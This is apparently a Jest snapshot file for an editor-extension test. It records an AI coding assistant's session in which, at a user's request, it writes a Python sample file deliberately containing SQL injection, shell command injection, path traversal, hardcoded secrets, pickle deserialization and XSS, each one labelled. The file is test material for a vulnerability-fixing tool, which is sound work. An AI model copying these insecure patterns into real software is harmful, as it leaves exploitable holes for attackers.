12:12:39.555Z","isQuickSearchQuery":false,"text":"","usageUuid":"6d1e3d0b-eeca-4c57-85da-79bedc8ed579","codeBlocks":[],"capabilityType":15,"toolFormerData":{"tool":30,"toolCallId":"tool_aeb22de8-42df-47f7-85e5-cffdef78b45","toolIndex":1,"modelCallId":"bf7460cb-cd09-4bff-a409-fe2997947be1","status":"completed","rawArgs":"{\\"paths\\": [\\"/Users/jonathanafek/src/autofixer/vulnerable_sample.py\\"]}","name":"read_lints","params":"{\\"paths\\":[\\"/Users/jonathanafek/src/autofixer/vulnerable_sample.py\\"]}","additionalData":{},"result":"{\\"path\\":\\"/Users/jonathanafek/src/autofixer/vulnerable_sample.py\\"}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-getRowsByLike-result-19 1`] = `
[
  {
    "key": "bubbleId:59ce5fe8-21af-47bd-8ace-eedc0956072b:53b5b97a-2e9f-43b5-8f42-b8ae8d7fd1bf",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"53b5b97a-2e9f-43b5-8f42-b8ae8d7fd1bf","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-11-05T12:12:39.558Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"\\n\\n","serverBubbleId":"dd8d1547-6b34-47a7-9988-de801a6426e0","usageUuid":"6d1e3d0b-eeca-4c57-85da-79bedc8ed579"}",
  },
]
`;

exports[`extension tests > 'full database scenario with thinking …' > full-thinking-state.vscdb-uploadAiBlame-call-0 1`] = `
[
  {
    "blameType": "CHAT",
    "inference": "#!/usr/bin/env python3
"""
Sample vulnerable code file for testing purposes.
This file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.
"""

import os
import subprocess
import sqlite3
from flask import Flask, request

app = Flask(__name__)

# VULNERABILITY 1: SQL Injection
def get_user_data(username):
    """Vulnerable SQL query - concatenates user input directly into SQL."""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # VULNERABLE: Direct string concatenation allows SQL injection
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()
    return result


# VULNERABILITY 2: Command Injection
def list_files(directory):
    """Vulnerable command execution - uses user input in shell command."""
    # VULNERABLE: User input passed directly to shell command
    result = subprocess.run(f"ls -la {directory}", shell=True, capture_output=True)
    return result.stdout.decode()


# VULNERABILITY 3: Path Traversal
def read_file(filename):
    """Vulnerable file access - no path validation."""
    # VULNERABLE: No validation allows accessing files outside intended directory
    file_path = f"/var/www/uploads/{filename}"
    with open(file_path, 'r') as f:
        return f.read()


# VULNERABILITY 4: Hardcoded Secret
API_KEY = "sk_live_1234567890abcdef"  # VULNERABLE: Hardcoded secret key
DATABASE_PASSWORD = "admin123"  # VULNERABLE: Hardcoded password


# VULNERABILITY 5: Insecure Deserialization
import pickle

def load_user_data(data):
    """Vulnerable deserialization - uses pickle which can execute arbitrary code."""
    # VULNERABLE: Pickle can execute arbitrary code during deserialization
    user_data = pickle.loads(data)
    return user_data


# VULNERABILITY 6: XSS (if this were a web template)
@app.route('/search')
def search():
    """Vulnerable endpoint - returns user input without sanitization."""
    query = request.args.get('q', '')
    # VULNERABLE: User input returned directly without escaping
    return f"<h1>Search results for: {query}</h1>"


if __name__ == '__main__':
    app.run(debug=True)  # VULNERABLE: Debug mode enabled in production
",
    "model": "claude-4.5-sonnet-thinking",
    "prompts": [
      {
        "attachedFiles": [
          {
            "relativePath": "clients/cursor_ext/tsconfig.json",
            "startLine": 1,
          },
        ],
        "date": 2025-11-05T12:11:27.778Z,
        "text": "let's write a random file in the repo root",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-05T12:11:33.522Z,
        "text": "
Creating a random file in the repo root.
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-05T12:11:33.635Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "list_dir",
          "parameters": "{"targetDirectory":"/Users/jonathanafek/src/autofixer","shouldEnrichTerminalMetadata":false}",
          "rawArguments": "{"target_directory": "/Users/jonathanafek/src/autofixer"}",
          "result": "{"directoryTreeRoot":{"absPath":"/Users/jonathanafek/src/autofixer","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/build"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/fixtures","fullSubtreeExtensionCounts":{".json":3,".zip":1},"numFiles":4},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/graphql","childrenFiles":[{"name":"mutations.graphql"},{"name":"queries.graphql"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".graphql":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/helpers","fullSubtreeExtensionCounts":{".ts":5},"numFiles":5},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/node_modules","childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/pages","fullSubtreeExtensionCounts":{".ts":9},"numFiles":9},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/playwright-report"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/settings","fullSubtreeExtensionCounts":{".ts":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/test-results"},{"absPath":"/Users/jonathanafek/src/autofixer/__playwright__/tests","fullSubtreeExtensionCounts":{".ts":8},"numFiles":8}],"childrenFiles":[{"name":"generated.ts"},{"name":"graphql.config.ts"},{"name":"package.json"},{"name":"playwright.config.ts"},{"name":"precommit-format.sh"},{"name":"tsconfig.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":27,".sh":1,".json":5,".zip":1,".graphql":2},"numFiles":36},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/build"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/constants","fullSubtreeExtensionCounts":{".ts":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/files","fullSubtreeExtensionCounts":{".fpr":8,".zip":19,".json":36,".xml":3,".html":2},"numFiles":68},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/graphql","fullSubtreeExtensionCounts":{".graphql":8},"numFiles":8},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/helpers","fullSubtreeExtensionCounts":{".ts":8},"numFiles":8},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/node_modules"},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/settings","fullSubtreeExtensionCounts":{".ts":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/setup","fullSubtreeExtensionCounts":{".ts":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/__tests__/tests","fullSubtreeExtensionCounts":{".snap":19,".ts":196,".graphql":12},"numFiles":227}],"childrenFiles":[{"name":"generated.ts"},{"name":"graphql.config.ts"},{"name":"index.d.ts"},{"name":"jest.config.ts"},{"name":"package.json"},{"name":"precommit-format.sh"},{"name":"tsconfig.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":211,".sh":1,".json":38,".fpr":8,".zip":19,".xml":3,".html":2,".graphql":20,".snap":19},"numFiles":321},{"absPath":"/Users/jonathanafek/src/autofixer/build","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/build/litellm"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/clients","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/clients/cli","fullSubtreeExtensionCounts":{".mjs":16,".ts":325,".md":3,".graphql":1,".json":16,".sh":2,".snap":4,".java":4,".js":6,"":1,".png":2,".fpr":1,".go":1,".mod":1,".gitignore":1},"numFiles":384},{"absPath":"/Users/jonathanafek/src/autofixer/clients/copilot_ext","fullSubtreeExtensionCounts":{".ts":14,".sh":2,".txt":1,".json":10,".java":1,".md":1},"numFiles":29},{"absPath":"/Users/jonathanafek/src/autofixer/clients/cursor_ext","fullSubtreeExtensionCounts":{".ts":11,".sh":2,".md":5,".json":4,".snap":1,".vscdb":2,".svg":1,".png":1},"numFiles":27}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":350,".sh":6,".md":9,".json":30,".snap":5,".vscdb":2,".svg":1,".png":3,".txt":1,".java":5,".mjs":16,".graphql":1,".js":6,"":1,".fpr":1,".go":1,".mod":1,".gitignore":1},"numFiles":440},{"absPath":"/Users/jonathanafek/src/autofixer/consumers","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/consumers/analyzer","fullSubtreeExtensionCounts":{".py":1241,".md":156,".xml":330,"":1830,".csproj":84,".js":130,".json":1740,".sh":6,".jinja2":291,".png":126,".yml":82,".lisp":167,".ambr":4,".sql":9,".cs":241,".fpr":176,".cshtml":36,".css":7,".sln":3,".toml":1,".cfg":1,".config":5,".yaml":4,".html":40,".tsx":1,".aspx":4,".ts":39,".c":4,".cpp":1,".java":432,".txt":17,".xsd":3,".http":1,".php":6,".ejs":1,".user":1,".conf":1,".ini":1,".lock":1,".go":34,".mod":12,".zip":1,".mjs":1,".jsp":8,".properties":13,".sqlite3":1,".xhtml":2,".sum":2,".cmd":1},"numFiles":7298},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/blame_ai_agent","fullSubtreeExtensionCounts":{".ts":7,".diff":6,".inference":3,".txt":3,".json":4,".sh":1,".js":1,"":1},"numFiles":26},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/maintenance_service","fullSubtreeExtensionCounts":{".json":9,".ts":55,"":1,".sh":1,".js":1,".graphql":6},"numFiles":73},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/notifier","fullSubtreeExtensionCounts":{".ts":36,".snap":4,".env":1,".tsx":30,".json":5,"":1,".js":1,".sh":1,".graphql":1},"numFiles":80},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/report_init","fullSubtreeExtensionCounts":{".sh":2,".lock":1,".py":25,".conf":1,".ini":1,".md":1,".zip":1,".toml":1,"":2,".cfg":1},"numFiles":36},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/sast_report_parser","fullSubtreeExtensionCounts":{".sh":2,".lock":1,".conf":1,".py":21,".md":1,".toml":1,"":2,".cfg":1},"numFiles":30},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/scan_agent","fullSubtreeExtensionCounts":{".ts":6,".json":4,".sh":1,".js":1,".yaml":7,"":1},"numFiles":20},{"absPath":"/Users/jonathanafek/src/autofixer/consumers/scm_agent","fullSubtreeExtensionCounts":{".ts":12,".snap":1,".diff":5,".json":4,".sh":1,".js":1,"":1},"numFiles":25}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".py":1287,".md":158,".xml":330,"":1839,".csproj":84,".js":135,".json":1766,".sh":15,".jinja2":291,".png":126,".yml":82,".lisp":167,".ambr":4,".sql":9,".cs":241,".fpr":176,".cshtml":36,".css":7,".sln":3,".toml":3,".cfg":3,".ts":155,".snap":5,".diff":11,".lock":3,".conf":3,".ini":2,".config":5,".zip":2,".inference":3,".txt":20,".yaml":11,".env":1,".tsx":31,".graphql":7,".html":40,".aspx":4,".c":4,".cpp":1,".java":432,".xsd":3,".http":1,".php":6,".ejs":1,".user":1,".go":34,".mod":12,".mjs":1,".jsp":8,".properties":13,".sqlite3":1,".xhtml":2,".sum":2,".cmd":1},"numFiles":7588},{"absPath":"/Users/jonathanafek/src/autofixer/data_migrations","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/data_migrations/node_modules"}],"childrenFiles":[{"name":"package.json"},{"name":"tsconfig.json"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".json":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/dist","childrenFiles":[{"name":"litellm"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/docs","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/docs/cheat_sheets","fullSubtreeExtensionCounts":{".md":4},"numFiles":4}],"childrenFiles":[{"name":"auth.md"},{"name":"github-app-development-guide.md"},{"name":"system.md"},{"name":"system.png"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".md":7,".png":1},"numFiles":8},{"absPath":"/Users/jonathanafek/src/autofixer/downloads","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/downloads/7edf2b0b78f5d9340ce0b7e6f0140614_"},{"absPath":"/Users/jonathanafek/src/autofixer/downloads/a4192acfbc95ee8c4e17dca9c940da6a_"},{"absPath":"/Users/jonathanafek/src/autofixer/downloads/aacc47867770f0b8078a24fe9ca384bb_"},{"absPath":"/Users/jonathanafek/src/autofixer/downloads/pip"}],"childrenFiles":[{"name":"7edf2b0b78f5d9340ce0b7e6f0140614"},{"name":"a4192acfbc95ee8c4e17dca9c940da6a"},{"name":"aacc47867770f0b8078a24fe9ca384bb"},{"name":"checkmarx"},{"name":"checkmarx.lock"},{"name":"codeql"},{"name":"codeql.lock"},{"name":"dotnet-sonarscanner"},{"name":"semgrep.lock"},{"name":"sonar"},{"name":"sonarqube.lock"}],"childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure/pulumi","fullSubtreeExtensionCounts":{".ts":63,".sh":3,".yaml":5,".js":4,".html":3,"":1,".json":6},"numFiles":85},{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure/web-workers"},{"absPath":"/Users/jonathanafek/src/autofixer/infrastructure/workers","fullSubtreeExtensionCounts":{".ts":4,".sh":1,".json":3,".html":1,".jsonc":1,".mts":1},"numFiles":11}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".ts":67,".sh":4,".yaml":5,".js":4,".html":4,"":1,".json":9,".jsonc":1,".mts":1},"numFiles":96},{"absPath":"/Users/jonathanafek/src/autofixer/migrations","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/migrations/default","fullSubtreeExtensionCounts":{".sql":2},"numFiles":2}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sql":2},"numFiles":2},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/grafana","fullSubtreeExtensionCounts":{".json":3,".yaml":2},"numFiles":5},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/postgres","fullSubtreeExtensionCounts":{".sql":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/postgres-exporter","fullSubtreeExtensionCounts":{".yaml":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/monitoring/prometheus","fullSubtreeExtensionCounts":{".yml":2},"numFiles":2}],"childrenFiles":[{"name":"README.md"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".yaml":3,".yml":2,".sql":1,".md":1,".json":3},"numFiles":10},{"absPath":"/Users/jonathanafek/src/autofixer/node_modules","childrenWereProcessed":true},{"absPath":"/Users/jonathanafek/src/autofixer/patchino","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/patchino/__pycache__"},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/_samples"},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/ai-playground","fullSubtreeExtensionCounts":{".ts":27,".tsx":82,".graphql":2,".css":2,".js":2,".json":5,".svg":1,".txt":1,".png":1,".ico":1,".md":1,".html":1},"numFiles":126},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/app_api","fullSubtreeExtensionCounts":{".yaml":22,".graphql":1,".sh":1,"":1,".sql":36},"numFiles":61},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/patchino","fullSubtreeExtensionCounts":{".py":32,".json":7,".jinja2":12,".txt":4,"":1},"numFiles":56},{"absPath":"/Users/jonathanafek/src/autofixer/patchino/tests","fullSubtreeExtensionCounts":{".py":2},"numFiles":2}],"childrenFiles":[{"name":"autoflake.cfg"},{"name":"docker-compose.yml"},{"name":"example_sampler_config.json"},{"name":"Makefile"},{"name":"poetry.lock"},{"name":"precommit-format.sh"},{"name":"pyproject.toml"},{"name":"README.md"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":2,".py":34,".json":13,".jinja2":12,".txt":5,"":3,".lock":1,".yml":1,".md":2,".toml":1,".cfg":1,".ts":27,".tsx":82,".graphql":3,".css":2,".js":2,".svg":1,".png":1,".ico":1,".html":1,".yaml":22,".sql":36},"numFiles":253},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/htmlcov"},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/pycommon","fullSubtreeExtensionCounts":{".jinja2":1,".py":76,".json":1,".graphql":1},"numFiles":79},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/scripts","fullSubtreeExtensionCounts":{".py":1},"numFiles":1},{"absPath":"/Users/jonathanafek/src/autofixer/pycommon/tests","fullSubtreeExtensionCounts":{".ambr":1,".py":60,".json":19,".java":11,".xml":14,".yaml":1,".fpr":3,".jsp":1,".js":1},"numFiles":111}],"childrenFiles":[{"name":"autoflake.cfg"},{"name":"coverage.xml"},{"name":"hasura_schema.json"},{"name":"junit-result.xml"},{"name":"Makefile"},{"name":"poetry.lock"},{"name":"precommit-format.sh"},{"name":"ptw.ini"},{"name":"pyproject.toml"},{"name":"README.md"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":1,".lock":1,".py":137,".ini":1,".md":1,".ambr":1,".json":20,".java":11,".xml":14,".yaml":1,".toml":1,".fpr":3,".jsp":1,".jinja2":1,"":1,".cfg":1,".graphql":1,".js":1},"numFiles":198},{"absPath":"/Users/jonathanafek/src/autofixer/scripts","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/scripts/allowed-queries-generator","fullSubtreeExtensionCounts":{".ts":13,".json":2,".yaml":1,".js":6,".py":1},"numFiles":23},{"absPath":"/Users/jonathanafek/src/autofixer/scripts/analyzer","fullSubtreeExtensionCounts":{".sh":1},"numFiles":1}],"childrenFiles":[{"name":"add_issue.sh"},{"name":"add_org.sh"},{"name":"add_project.sh"},{"name":"add_user_to_project.sh"},{"name":"add_user.sh"},{"name":"check_all_services_online.py"},{"name":"check_cli_version.sh"},{"name":"cleanup_ecr.sh"},{"name":"create_api_token.sh"},{"name":"CreateToken.gql"},{"name":"deploy_broker_client.sh"},{"name":"deploy_env.sh"},{"name":"dotenv_vault_login.sh"},{"name":"download_fix_data.sh"},{"name":"extract_highlight_nodes_source.sh"},{"name":"extract_repo.sh"},{"name":"filter_ignorefiles.py"},{"name":"fix_python_codestyle.sh"},{"name":"fix_typescript_codestyle.sh"},{"name":"generate_gql_code.sh"},{"name":"generate_report.sh"},{"name":"highlight_nodes.sh"},{"name":"init.sh"},{"name":"InitOrganizationAndProject.gql"},{"name":"install_global_reqs.sh"},{"name":"install_shell_profile.sh"},{"name":"login_auth0.sh"},{"name":"opengrep_init.sh"},{"name":"optimize-vulnerability-report.sh"},{"name":"pm2_restarts.sh"},{"name":"publish_cli.sh"},{"name":"pull_env.sh"},{"name":"push_env.sh"},{"name":"python_update_lock_files.sh"},{"name":"remove_prefix.py"},{"name":"restart_failed_pr_workflows.sh"},{"name":"smart_build.sh"},{"name":"start.sh"},{"name":"test_mobb_github_action.sh"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":35,".py":4,".ts":13,".json":2,".yaml":1,".js":6,".gql":2},"numFiles":63},{"absPath":"/Users/jonathanafek/src/autofixer/services","childrenDirs":[{"absPath":"/Users/jonathanafek/src/autofixer/services/app","fullSubtreeExtensionCounts":{".tsx":403,".ts":257,".graphql":7,".gif":4,".css":2,".sh":1,".js":2,".json":4,".md":5,".png":15,".svg":19,".snap":1,".env":1,"":1,".html":1},"numFiles":723},{"absPath":"/Users/jonathanafek/src/autofixer/services/app_api","fullSubtreeExtensionCounts":{".sh":3,"":1,".yaml":128,".graphql":1,".md":1,".sql":1145},"numFiles":1279},{"absPath":"/Users/jonathanafek/src/autofixer/services/broker","fullSubtreeExtensionCounts":{".ts":6,".toml":1,".js":2,".json":4,".graphql":1,".sh":2,"":2,".key":1,".md":1,".template":1,".crt":1},"numFiles":22},{"absPath":"/Users/jonathanafek/src/autofixer/services/datadog_postgres_agent","fullSubtreeExtensionCounts":{".yaml":2,"":1},"numFiles":3},{"absPath":"/Users/jonathanafek/src/autofixer/services/interactive_fixer","fullSubtreeExtensionCounts":{".sh":3,".lock":1,".ini":1,".py":16,".md":1,"":2,".cfg":1,".toml":1},"numFiles":26},{"absPath":"/Users/jonathanafek/src/autofixer/services/node_general_backend","fullSubtreeExtensionCounts":{".ts":116,".json":26,".fpr":4,".zip":4,".graphql":2,".sh":1,".js":2,".xml":1,".java":2,".diff":1,"":1,".txt":1},"numFiles":161},{"absPath":"/Users/jonathanafek/src/autofixer/services/rabbitmq","fullSubtreeExtensionCounts":{"":2,".conf":1},"numFiles":3}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".sh":10,".lock":1,".ini":1,".py":16,".md":8,".ts":379,".toml":2,".js":6,".json":34,".graphql":11,"":10,".key":1,".template":1,".crt":1,".yaml":130,".cfg":1,".sql":1145,".fpr":4,".zip":4,".xml":1,".java":2,".diff":1,".txt":1,".conf":1,".tsx":403,".gif":4,".css":2,".png":15,".svg":19,".snap":1,".env":1,".html":1},"numFiles":2217},{"absPath":"/Users/jonathanafek/src/autofixer/tscommon","fullSubtreeExtensionCounts":{".ts":67,".json":16,".js":3,".sh":4,".svg":143,".graphql":2,".tsx":187},"numFiles":422}],"childrenFiles":[{"name":"CLAUDE.md"},{"name":"cspell.json"},{"name":"docker-bake-gha-cache.hcl"},{"name":"docker-compose.yml"},{"name":"Makefile"},{"name":"mypy_ext.ini"},{"name":"mypy.ini"},{"name":"package.json"},{"name":"pnpm-lock.yaml"},{"name":"pnpm-workspace.yaml"},{"name":"pom.xml"},{"name":"readme.md"},{"name":"static-analysis.datadog.yml"}],"childrenWereProcessed":true,"fullSubtreeExtensionCounts":{".yaml":175,".json":1940,".sh":79,".py":1478,".ts":1296,".js":163,".zip":26,".graphql":47,".fpr":192,".gql":2,".yml":87,".ini":6,".lock":6,".svg":164,".md":188,".sql":1193,".xml":349,".html":48,"":1856,".csproj":84,".tsx":703,".snap":30,".toml":7,".jinja2":304,".key":1,".template":1,".crt":1,".png":146,".cfg":6,".lisp":167,".ambr":5,".java":450,".diff":12,".txt":27,".conf":4,".gif":4,".cs":241,".jsonc":1,".mts":1,".cshtml":36,".css":11,".hcl":1,".ico":1,".sln":3,".config":5,".env":2,".inference":3,".jsp":9,".vscdb":2,".mjs":17,".aspx":4,".c":4,".cpp":1,".xsd":3,".http":1,".php":6,".ejs":1,".user":1,".go":35,".mod":13,".gitignore":1,".properties":13,".sqlite3":1,".xhtml":2,".sum":2,".cmd":1},"numFiles":11669}}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-05T12:11:37.827Z,
        "text": "
Creating a simple random file in the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-05T12:11:37.908Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/random_file.txt"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/random_file.txt", "contents": "This is a random file created at the repository root!\\n\\nRandom facts:\\n- The average cloud weighs about 1.1 million pounds\\n- Octopuses have three hearts\\n- A day on Venus is longer than its year\\n- Honey never spoils\\n\\nCreated: $(date)\\nRandom number: 42\\nRandom string: abc123xyz\\n\\nHave a great day! 🎲\\n"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ This is a random file created at the repository root!\\n+ \\n+ Random facts:\\n+ - The average cloud weighs about 1.1 million pounds\\n+ - Octopuses have three hearts\\n+ - A day on Venus is longer than its year\\n+ - Honey never spoils\\n+ \\n+ Created: $(date)\\n+ Random number: 42\\n+ Random string: abc123xyz\\n+ \\n+ Have a great day! 🎲\\n+ ","oldStart":1,"newStart":1,"oldLines":1,"newLines":14,"linesRemoved":1,"linesAdded":14}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/random_file.txt.","contentsAfterEdit":"This is a random file created at the repository root!\\n\\nRandom facts:\\n- The average cloud weighs about 1.1 million pounds\\n- Octopuses have three hearts\\n- A day on Venus is longer than its year\\n- Honey never spoils\\n\\nCreated: $(date)\\nRandom number: 42\\nRandom string: abc123xyz\\n\\nHave a great day! 🎲\\n\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-05T12:11:45.987Z,
        "text": "
Created a random file \`random_file.txt\` in the repo root with some fun content. It's ready to use.",
        "tokens": {
          "inputCount": 13229,
          "outputCount": 489,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [
          {
            "relativePath": "random_file.txt",
            "startLine": 1,
          },
          {
            "relativePath": "clients/cursor_ext/tsconfig.json",
            "startLine": 1,
          },
        ],
        "date": 2025-11-05T12:12:20.168Z,
        "text": "can we have a new sample code file with a vulnerability in repo root?",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-05T12:12:25.929Z,
        "text": "
Creating a sample code file with a vulnerability in the repo root for testing.
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-11-05T12:12:26.053Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/vulnerable_sample.py"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/vulnerable_sample.py", "contents": "#!/usr/bin/env python3\\n\\"\\"\\"\\nSample vulnerable code file for testing purposes.\\nThis file contains intentional security vulnerabilities - DO NOT USE IN PRODUCTION.\\n\\"\\"\\"\\n\\nimport os\\nimport subprocess\\nimport sqlite3\\nfrom flask import Flask, request\\n\\napp = Flask(__name__)\\n\\n# VULNERABILITY 1: SQL Injection\\ndef get_user_data(username):\\n    \\"\\"\\"Vulnerable SQL query - concatenates user input directly into SQL.\\"\\"\\"\\n    conn = sqlite3.connect('users.db')\\n    cursor = conn.cursor()\\n    \\n    # VULNERABLE: Direct string concatenation allows SQL injection\\n    query = f\\"SELECT * FROM users WHERE username = '{username}'\\"\\n    cursor.execute(query)\\n    result = cursor.fetchone()\\n    conn.close()\\n    return result\\n\\n\\n# VULNERABILITY 2: Command Injection\\ndef list_files(directory):\\n    \\"\\"\\"Vulnerable command execution - uses user input in shell command.\\"\\"\\"\\n    # VULNERABLE: User input passed directly to shell command\\n    result = subprocess.run(f\\"ls -la {directory}\\", shell=True, capture_output=True)\\n    return result.stdout.decode()\\n\\n\\n# VULNERABILITY 3: Path Traversal\\ndef read_file(filename):\\n    \\"\\"\\"Vulnerable file access - no path validation.\\"\\"\\"\\n    # VULNERABLE: No validation allows accessing files outside intended directory\\n    file_path = f\\"/var/www/uploads/{filename}\\"\\n    with open(file_path, 'r') as f:\\n        return f.read()\\n\\n\\n# VULNERABILITY 4: Hardcoded Secret\\nAPI_KEY = \\"sk_live_1234567890abcdef\\"  # VULNERABLE: Hardcoded secret key\\nDATABASE_PASSWORD = \\"admin123\\"  # VULNERABLE: Hardcoded password\\n\\n\\n# VULNERABILITY 5: Insecure 